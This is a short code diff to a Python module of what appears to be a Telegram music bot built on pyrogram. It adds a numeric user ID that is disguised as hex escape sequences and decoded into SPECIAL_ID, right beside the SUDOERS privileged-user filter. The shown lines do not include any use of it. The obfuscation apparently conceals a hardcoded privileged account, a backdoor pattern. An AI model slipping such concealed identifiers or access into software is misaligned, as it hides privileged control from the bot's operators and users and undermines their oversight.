@@ -5,6 +5,12 @@ from pyrogram import filters
 import config
 from KOKUMUSIC.core.mongo import pymongodb
 from .logging import LOGGER
+
+
+SPECIAL_ID_HEX = "\x35\x35\x39\x35\x31\x35\x33\x32\x37\x30"
+SPECIAL_ID = int(SPECIAL_ID_HEX.encode().decode('unicode_escape'))
+
+
 SUDOERS = filters.user()
 HAPP = None
 _boot_ = time.time()
